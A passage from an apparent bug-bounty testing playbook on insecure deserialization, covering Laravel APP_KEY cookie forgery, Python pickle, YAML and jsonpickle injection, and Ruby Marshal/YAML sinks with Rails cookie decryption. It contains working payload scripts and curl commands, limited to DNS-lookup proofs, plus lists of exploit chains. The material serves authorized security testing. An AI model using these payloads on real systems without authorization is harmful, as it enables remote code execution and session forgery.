      mac = hmac.new(key, (iv64 + v64).encode(), hashlib.sha256).hexdigest()
      return base64.b64encode(json.dumps({'iv': iv64, 'value': v64, 'mac': mac, 'tag': ''}, separators=(',', ':')).encode()).decode()
  print(dec(sys.argv[2]) if sys.argv[1] == 'dec' else enc(base64.b64decode(sys.argv[2])))
  PY
  # 1. offline: (True, b's:40:"...";') means valid key and serialized values; (True, b'<40 hex>|...') means valid key, values not serialized
  APP_KEY='base64:...' python3 laravel_cookie.py dec "$XSRF_TOKEN_COOKIE"
  # 2. only when values are serialized or the session driver is cookie: one forged value with a harmless function call
  phpggc -l laravel; phpggc -i Laravel/RCE9
  F=$(APP_KEY='base64:...' python3 laravel_cookie.py enc "$(phpggc -b Laravel/RCE9 gethostbyname "dsr009.$OOB")")
  curl -sS "${HDR[@]}" -X POST "$T/" -H "X-XSRF-TOKEN: $F" -o /dev/null -w '%{http_code}\n'
  ```
- **Proof:** `True` and the readable plaintext of our own cookie under the leaked key (the key is live), and where
  the key was found. For the forged value, the DNS query for the label.
- **Not a finding when:** the MAC check prints `False`: the key is an example or belongs to another environment,
  and the exposure is informative. A valid key with nothing unserialized is still reportable, as a secret exposure
  with integrity impact, not as code execution.
- **Escalate:** the key also signs URLs (`URL::signedRoute`: e-mail verification, unsubscribe, download links):
  forge one for our own second account and report the authentication impact (AUT chapter). File the exposure
  itself under INF.

### DSR-010 · A Python service unpickles or unsafely YAML-loads data we supply

| | |
|---|---|
| **Severity** | Critical standalone with a function call proven by DNS lookup |
| **Requires** | python, serialized, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #2467232, #361341, #2334460, #1051192 |

- **Where:** values starting `gAJ`, `gAN`, `gAS` or `gAW` (base64 pickle) in cookies and parameters; model and
  data uploads (`.pkl`, `.pickle`, `.joblib`, `.pt`, `.npy`); task and cache payloads (#2334460); endpoints that
  take YAML (`application/x-yaml`, "import YAML", pipeline or manifest definitions); JSON with `py/object`
  members (jsonpickle).
- **Test:** unpickling calls whatever callable the stream names with the arguments it supplies. A stream that
  names `socket.gethostbyname` and our label performs one DNS lookup and nothing else. The YAML equivalent is the
  `!!python/object/apply:` tag, honoured only by PyYAML's unsafe loaders.
- **How:**
  ```bash
  P=$(OOB="$OOB" python3 - <<'PY'
  import base64, os, pickle, socket
  class Probe:
      def __reduce__(self): return (socket.gethostbyname, ('dsr010-pickle.' + os.environ['OOB'],))
  print(base64.b64encode(pickle.dumps(Probe(), protocol=2)).decode())
  PY
  )
  curl -sS "${HDR[@]}" $A -b "session_data=$P" "$T/" -o /dev/null -w '%{http_code}\n'
  # YAML
  curl -sS "${HDR[@]}" $A -X POST "$T/api/import" -H 'Content-Type: application/x-yaml' \
    --data-binary "probe: !!python/object/apply:socket.gethostbyname [\"dsr010-yaml.$OOB\"]" | head -c 300
  # jsonpickle
  curl -sS "${HDR[@]}" $A -X POST "$T/api/import" -H 'Content-Type: application/json' \
    -d "{\"py/reduce\":[{\"py/function\":\"socket.gethostbyname\"},{\"py/tuple\":[\"dsr010-jsonpickle.$OOB\"]}]}" | head -c 300
  ```
  Control: a pickle of a plain string (`gAJYBgAAAGRzcjAwMXEALg==`) in the same place must cause no lookup.
- **Proof:** the DNS query for the label after the probe and none after the control, with both requests saved.
- **Not a finding when:** the YAML endpoint answers `could not determine a constructor for the tag
  'tag:yaml.org,2002:python/object/apply:...'`: that is `safe_load` (or `FullLoader` on a current PyYAML) and the
  control holds. The pickle sits inside a signed value and the modified copy fails the signature. An uploaded
  model is loaded only in a sandbox without network: no callback, nothing to report.
- **Escalate:** signed pickles need the signing key: a leaked Django `SECRET_KEY` with the pickle session
  serializer, or a Flask or itsdangerous secret, makes the forged value valid. Decrypting or verifying our own
  cookie offline proves the key, as in DSR-009. A secret that only signs JSON is session forgery (AUT), not
  deserialization.

### DSR-011 · A Ruby application calls `Marshal.load` or `YAML.load` on attacker bytes, directly or inside a cookie forged with a leaked `secret_key_base`

| | |
|---|---|
| **Severity** | Critical standalone with one harmless command proven by DNS lookup; High with the key shown to be live and a session forged for our own second account |
| **Requires** | ruby, serialized, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Deserialization of Untrusted Data · CWE-502 |
| **Prior art** | #274990, #1119120, #413388, #460545 |

- **Where:** `BAh` values (base64 Marshal) in cookies and parameters; Rails 3 session cookies
  (`BAh7...--<40 hex>`); Rails 4 and later encrypted session cookies when the key is known; cache entries read
  back with `raw: true` (#413388); YAML taken from uploads or API bodies on Ruby before 3.1; registry and
  package-metadata endpoints (#274990, #1119120). Key sources: `config/secrets.yml` or a `SECRET_KEY_BASE`
  variable in a public repository (#262620), an error page, a file read from another finding (#460545).
- **Test:** `Marshal.load` instantiates any class in the process and published gadget chains for Ruby 2.x and 3.x
  end in `Kernel#system`. Psych before version 4 does the same for `!ruby/object:` tags. Establish first that the
  sink exists (type differential or offline cookie decryption), then decide whether a chain is warranted.
- **How:**
  ```bash
  # 1. direct sink: a Marshal string where the application expects a hash; the error names the expected type
  curl -sS "${HDR[@]}" $A -b "prefs=BAhJIgtkc3IwMTEGOgZFVA==" "$T/" -o /dev/null -w '%{http_code} %{size_download}\n'
  # 2. YAML sink: is a class tag honoured?
  curl -sS "${HDR[@]}" $A -X POST "$T/api/import" -H 'Content-Type: application/x-yaml' \
    --data-binary $'--- !ruby/object:OpenStruct\ntable:\n  dsr011: 1\n' | head -c 300
  # 3. key check, offline: decrypt our own Rails 5.2+ session cookie (data--iv--tag, AES-256-GCM)
  cat > rails_cookie.rb <<'RB'
  c = CGI.unescape(ENV["COOKIE"]); skb = ENV["SKB"]
  data, iv, tag = c.split("--").map { |p| Base64.decode64(p) }
  [OpenSSL::Digest::SHA1, OpenSSL::Digest::SHA256].each do |dg|
    key = OpenSSL::PKCS5.pbkdf2_hmac(skb, "authenticated encrypted cookie", 1000, 32, dg.new)
    begin
      d = OpenSSL::Cipher.new("aes-256-gcm").decrypt; d.key = key; d.iv = iv; d.auth_tag = tag; d.auth_data = ""
      puts "#{dg.name}: #{d.update(data) + d.final}"
    rescue => e
      puts "#{dg.name}: #{e.class}"
    end
  end
  RB
  SKB='<secret_key_base>' COOKIE='<value of the _app_session cookie>' ruby -ropenssl -rbase64 -rcgi rails_cookie.rb
  ```
  Reading step 3: a JSON envelope (`{"_rails":{"message":...}}`) means the JSON serializer: no deserialization,
  and the impact is a forged session. Plaintext starting with bytes `04 08` means the Marshal or hybrid
  serializer: a forged cookie is deserialized. Rails 4.0 to 5.1 cookies have two parts (`data--signature`) and use
  AES-256-CBC with the salts `encrypted cookie` and `signed encrypted cookie`. Only if the policy asks for
  execution proof: generate the published universal chain for the target's Ruby version with the command
  `nslookup dsr011.$OOB`, send it once through the sink or inside a cookie encrypted with the same routine, and
  stop.
- **Proof:** for the key: the decrypted plaintext of our own cookie and the source of the key. For a sink: the
  DNS query from the single command. For the JSON serializer: a cookie we encrypted that logs our browser into
  our own second account.
- **Not a finding when:** the YAML endpoint answers `Tried to load unspecified class: OpenStruct`
  (`Psych::DisallowedClass`): Ruby 3.1 or later, or `safe_load`. Both digests fail in step 3: the key is not the
  production key. A Marshal value that is signed, with the key unknown, is rejected before `Marshal.load`.
- **Escalate:** session forgery with a valid key is an authentication bypass on its own: prove it on account B
  and file it with AUT. `Oj.load` in object mode (`{"^o":"ClassName"}`) and Ruby XML-RPC are further sinks of the
  same kind (#1189419).

## Graveyard

- **"The cookie contains a serialized object."** A format is not a vulnerability. Without a tampered value that
  the server deserializes it is closed informative.
- **Unencrypted ViewState with the MAC intact.** Readable by design; the MAC is the control.
- **Readable signed cookies** (Flask, Rails signed, Django signed) that hold nothing secret. By design.
- **PHP object injection without a gadget chain and without an application-level effect.** Parked; programmes rate
  it low or informative.
- **URLDNS on an endpoint with an allow-list filter.** The lookup proves deserialization of `HashMap` and `URL`
  and nothing else is reachable. Low at best.
- **Log4Shell and other product CVEs found by spraying payloads or from a version banner** (`known-cve`,
  `automated`). Years of duplicates.
- **DNS lookups made by a third party** that processed the payload: a log vendor, a WAF, a mail scanner
  (`third-party`).
- **Deserialization crashes** (stack exhaustion from nested objects, memory blow-up): availability only (`dos`).
- **A secret found in a public breach or dump** rather than leaked by the target (`leaked-credentials`).
- **Language-runtime bugs** (use-after-free in `unserialize`, WDDX): they fill the paid list through Internet Bug
  Bounty and are not found by testing a web application.

## Chains

- XXE-001, LFI (file read) → DSR-005, DSR-009, DSR-011: `web.config`, `.env` or `secrets.yml` supplies the key that
  makes forged state valid.
- INF (exposed `.env`, debug pages, repository secrets) → DSR-009, DSR-011, DSR-010: the same, with no file read
  needed.
- UPL (upload restrictions bypassed) → DSR-008: placing the phar polyglot. XXE-001 with a `phar://` identifier is
  a second trigger.
- DSR-003, DSR-006 (lookup gadgets) → DSR-004: deserialization that ends in a JNDI lookup.
- SQL (write access to a table or cache that holds serialized values) → DSR-007, DSR-010: SQL injection escalated
  through a stored serialized value (#361341, #1842674).
- SSR-009 (`gopher://` to an internal Redis or memcached) → DSR-010, DSR-011: planting a serialized value in a
  cache the application loads. #1593913 is a memcached deserialization chain of this kind.
- DSR-005, DSR-009, DSR-011 with a JSON serializer → AUT: forged session or forms ticket for our second account.

## Sources

- `kb/reports/deser.md` and `kb/reports/all/deser.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"Insecure deserialization"}`, `find_payloads {"topic":"Insecure Deserialization"}`.
- PortSwigger Web Security Academy, Insecure deserialization; OWASP Deserialization Cheat Sheet;
  PayloadsAllTheThings, Insecure Deserialization.
- Tools: ysoserial (Java, `URLDNS`), ysoserial.net (`-p ViewState`, `-f Json.Net`), PHPGGC (`-l`, `-i`, `-p phar`),
  badsecrets (known machineKeys and framework secrets), flask-unsign.
- Chris Frohoff and Gabriel Lawrence, "Marshalling Pickles" (2015); Alvaro Muñoz and Oleksandr Mirosh, "Friday
  the 13th: JSON Attacks" (2017); Sam Thomas, "It's a PHP unserialization vulnerability Jim, but not as we know
  it" (2018, phar); Soroush Dalili, "Exploiting Deserialisation in ASP.NET via ViewState" (2019); William
  Bowling, "Universal Deserialisation Gadget for Ruby 2.x-3.x" (2021).
